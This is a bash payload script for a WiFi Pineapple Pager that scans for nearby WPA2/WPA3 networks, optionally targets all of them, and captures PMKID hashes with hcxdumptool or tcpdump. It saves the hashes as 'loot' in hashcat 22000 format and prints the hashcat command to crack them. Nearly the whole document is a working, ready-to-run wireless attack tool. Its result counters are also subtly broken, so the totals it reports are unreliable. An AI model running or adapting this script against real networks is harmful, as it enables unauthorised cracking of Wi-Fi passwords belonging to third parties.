#!/bin/bash
# Title:         PMKID Grabber
# Description:   Capture PMKID hashes from WPA2/WPA3 networks without client deauth
# Author:        bad-antics
# Version:       1.0
# Category:      Reconnaissance
# Target:        WiFi Pineapple Pager
#
# LED State Descriptions
# SETUP     - Initializing
# SPECIAL   - Capturing PMKIDs
# SUCCESS   - PMKIDs captured
# FAIL      - No PMKIDs captured
# CLEANUP   - Restoring interfaces
#
# Firmware:  Tested on firmware 1.0.4+
#
# NOTE: PMKID capture is a clientless attack — it does NOT
#       require deauthenticating any clients. The PMKID is
#       obtained directly from the AP's first EAPOL message.

# ============================================================================
# CONFIGURATION
# ============================================================================
INTERFACE="wlan0"
LOOT_DIR="/root/loot/pmkid"
SCAN_DURATION=20
CAPTURE_TIMEOUT=30

# ============================================================================
# CLEANUP TRAP
# ============================================================================
cleanup() {
    [ -n "$HCXDUMP_PID" ] && kill $HCXDUMP_PID 2>/dev/null
    airmon-ng stop "${INTERFACE}mon" 2>/dev/null
    airmon-ng stop "$INTERFACE" 2>/dev/null
    rm -rf "/tmp/pmkid_$$"
    LED CLEANUP
}
trap cleanup EXIT

# ============================================================================
# PAYLOAD START
# ============================================================================
LED SETUP

PROMPT "PMKID GRABBER v1.0

Capture PMKID hashes from
WPA2/WPA3 access points.

No client deauth needed!
Works by requesting the
PMKID from the AP directly
via the RSN PMKID field
in the first EAPOL message.

Captured hashes can be
cracked with hashcat
mode 22000.

Press OK to configure."

# ============================================================================
# SCAN FOR TARGETS
# ============================================================================
SPINNER_START "Scanning for targets..."

airmon-ng check kill 2>/dev/null
sleep 1
airmon-ng start "$INTERFACE" >/dev/null 2>&1
MON_IF="${INTERFACE}mon"
[ ! -d "/sys/class/net/$MON_IF" ] && MON_IF="$INTERFACE"

TEMP_DIR="/tmp/pmkid_$$"
mkdir -p "$TEMP_DIR"

timeout "$SCAN_DURATION" airodump-ng "$MON_IF" -w "$TEMP_DIR/scan" --output-format csv 2>/dev/null &
SCAN_PID=$!
sleep "$SCAN_DURATION"
kill $SCAN_PID 2>/dev/null
wait $SCAN_PID 2>/dev/null

SPINNER_STOP

# Parse targets (WPA2/WPA3 networks)
TARGETS=""
TARGET_COUNT=0
TARGET_LIST=""

if [ -f "$TEMP_DIR/scan-01.csv" ]; then
    while IFS=',' read -r BSSID F2 F3 CHANNEL F5 SPEED PRIVACY CIPHER AUTH POWER F11 F12 F13 ESSID REST; do
        BSSID=$(echo "$BSSID" | tr -d ' ' | tr '[:lower:]' '[:upper:]')
        ESSID=$(echo "$ESSID" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        CHANNEL_C=$(echo "$CHANNEL" | tr -d ' ')
        POWER_C=$(echo "$POWER" | tr -d ' ')
        ENC=$(echo "$PRIVACY" | tr -d ' ')

        if [ -n "$BSSID" ] && echo "$BSSID" | grep -qE "^[0-9A-Fa-f]{2}:" && echo "$ENC" | grep -qiE "WPA2|WPA3"; then
            TARGET_COUNT=$((TARGET_COUNT + 1))
            TARGETS="${TARGETS}${BSSID}|${ESSID}|${CHANNEL_C}|${POWER_C}|${ENC}\n"
            TARGET_LIST="${TARGET_LIST}${TARGET_COUNT}. ${ESSID}\n   ${BSSID} Ch:${CHANNEL_C}\n"
        fi
    done < "$TEMP_DIR/scan-01.csv"
fi

if [ "$TARGET_COUNT" -eq 0 ]; then
    LED FAIL
    PROMPT "NO WPA TARGETS

No WPA2/WPA3 networks
found. PMKID capture
requires WPA2 or WPA3.

Press OK to exit."
    exit 0
fi

# ============================================================================
# TARGET SELECTION
# ============================================================================
PROMPT "TARGETS FOUND: $TARGET_COUNT

$(echo -e "$TARGET_LIST" | head -20)

Press OK to choose target
or capture all."

MODE=$(CONFIRMATION_DIALOG "Capture ALL networks?

YES = Try all $TARGET_COUNT APs
NO  = Pick specific target")

if [ "$MODE" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    # Capture all
    SELECTED_TARGETS="$TARGETS"
    SELECTED_COUNT=$TARGET_COUNT
else
    TARGET_NUM=$(NUMBER_PICKER "Target # (1-${TARGET_COUNT}):" 1)
    [ -z "$TARGET_NUM" ] && TARGET_NUM=1
    SELECTED_TARGETS=$(echo -e "$TARGETS" | sed -n "${TARGET_NUM}p")
    SELECTED_COUNT=1
fi

TIMEOUT=$(NUMBER_PICKER "Timeout per AP (sec):" $CAPTURE_TIMEOUT)
[ -z "$TIMEOUT" ] && TIMEOUT=$CAPTURE_TIMEOUT

# ============================================================================
# PMKID CAPTURE
# ============================================================================
mkdir -p "$LOOT_DIR"
LOOT_FILE="$LOOT_DIR/pmkid_$(date +%Y%m%d_%H%M%S).txt"
HASH_FILE="$LOOT_DIR/pmkid_$(date +%Y%m%d_%H%M%S).22000"

{
    echo "════════════════════════════════════════"
    echo "  PMKID GRABBER - Capture Log"
    echo "════════════════════════════════════════"
    echo "Date:     $(date)"
    echo "Targets:  $SELECTED_COUNT"
    echo "Timeout:  ${TIMEOUT}s per AP"
    echo "════════════════════════════════════════"
    echo ""
} > "$LOOT_FILE"

LED SPECIAL
CAPTURED=0
FAILED=0

echo -e "$SELECTED_TARGETS" | while IFS='|' read -r T_BSSID T_ESSID T_CH T_PWR T_ENC; do
    [ -z "$T_BSSID" ] && continue

    LOG "Targeting: $T_ESSID ($T_BSSID) Ch:$T_CH"
    SPINNER_START "PMKID: $T_ESSID..."

    # Tune to target channel
    iwconfig "$MON_IF" channel "$T_CH" 2>/dev/null

    PMKID_CAPTURED=false

    # Method 1: hcxdumptool (best method)
    if command -v hcxdumptool >/dev/null 2>&1; then
        echo "$T_BSSID" | tr -d ':' > "$TEMP_DIR/filter.txt"

        timeout "$TIMEOUT" hcxdumptool -i "$MON_IF" \
            --filterlist_ap="$TEMP_DIR/filter.txt" \
            --filtermode=2 \
            --enable_status=1 \
            -o "$TEMP_DIR/capture_${T_BSSID//:/}.pcapng" 2>/dev/null
        HCXDUMP_PID=$!

        # Convert to hashcat format
        if command -v hcxpcapngtool >/dev/null 2>&1 && [ -f "$TEMP_DIR/capture_${T_BSSID//:/}.pcapng" ]; then
            RESULT=$(hcxpcapngtool -o "$TEMP_DIR/hash_${T_BSSID//:/}.22000" \
                "$TEMP_DIR/capture_${T_BSSID//:/}.pcapng" 2>&1)

            if [ -f "$TEMP_DIR/hash_${T_BSSID//:/}.22000" ] && [ -s "$TEMP_DIR/hash_${T_BSSID//:/}.22000" ]; then
                cat "$TEMP_DIR/hash_${T_BSSID//:/}.22000" >> "$HASH_FILE"
                PMKID_CAPTURED=true
                CAPTURED=$((CAPTURED + 1))
            fi
        fi

    # Method 2: tcpdump + manual PMKID extraction (fallback)
    else
        PCAP_FILE="$TEMP_DIR/eapol_${T_BSSID//:/}.pcap"

        timeout "$TIMEOUT" tcpdump -i "$MON_IF" -c 100 -w "$PCAP_FILE" \
            "ether host $T_BSSID and ether proto 0x888e" 2>/dev/null

        if [ -f "$PCAP_FILE" ] && [ -s "$PCAP_FILE" ]; then
            # Check for PMKID in EAPOL message 1
            PMKID_HEX=$(tcpdump -r "$PCAP_FILE" -XX 2>/dev/null | \
                grep -A1 "dd..0050f2" | grep -oE '([0-9a-f]{2} ){16}' | tr -d ' ' | head -1)

            if [ -n "$PMKID_HEX" ] && [ ${#PMKID_HEX} -eq 32 ]; then
                AP_MAC=$(echo "$T_BSSID" | tr -d ':' | tr '[:upper:]' '[:lower:]')
                # Build hashcat 22000 format line
                echo "WPA*02*${PMKID_HEX}*${AP_MAC}*****************${T_ESSID}***" >> "$HASH_FILE"
                PMKID_CAPTURED=true
                CAPTURED=$((CAPTURED + 1))
            fi
        fi
    fi

    SPINNER_STOP

    if [ "$PMKID_CAPTURED" = true ]; then
        {
            echo "  ✓ PMKID CAPTURED"
            echo "    SSID:    $T_ESSID"
            echo "    BSSID:   $T_BSSID"
            echo "    Channel: $T_CH"
            echo "    Encrypt: $T_ENC"
            echo ""
        } >> "$LOOT_FILE"
        LOG "✓ PMKID captured: $T_ESSID"
    else
        FAILED=$((FAILED + 1))
        {
            echo "  ✗ PMKID FAILED"
            echo "    SSID:    $T_ESSID"
            echo "    BSSID:   $T_BSSID"
            echo "    Reason:  AP may not support PMKID"
            echo ""
        } >> "$LOOT_FILE"
        LOG "✗ No PMKID: $T_ESSID"
    fi
done

# ============================================================================
# RESULTS
# ============================================================================
{
    echo "════════════════════════════════════════"
    echo "  CAPTURE COMPLETE"
    echo "════════════════════════════════════════"
    echo "Captured: $CAPTURED"
    echo "Failed:   $FAILED"
    [ -f "$HASH_FILE" ] && echo "Hashes:   $HASH_FILE"
    echo ""
    echo "Crack with hashcat:"
    echo "  hashcat -m 22000 $HASH_FILE wordlist.txt"
    echo "════════════════════════════════════════"
} >> "$LOOT_FILE"

if [ "$CAPTURED" -gt 0 ]; then
    LED SUCCESS

    PROMPT "PMKID CAPTURED: $CAPTURED

$CAPTURED of $SELECTED_COUNT
networks yielded PMKIDs.

Hash file (hashcat 22000):
$HASH_FILE

Crack command:
hashcat -m 22000
  hashes.22000 wordlist.txt

Log: $LOOT_FILE

Press OK to exit."
else
    LED FAIL
    PROMPT "NO PMKIDs CAPTURED

Tried $SELECTED_COUNT networks.
None returned PMKIDs.

Not all APs support PMKID.
Try different targets or
use traditional handshake
capture instead.

Press OK to exit."
fi

LOG "PMKID Grabber complete. Captured: $CAPTURED Failed: $FAILED"
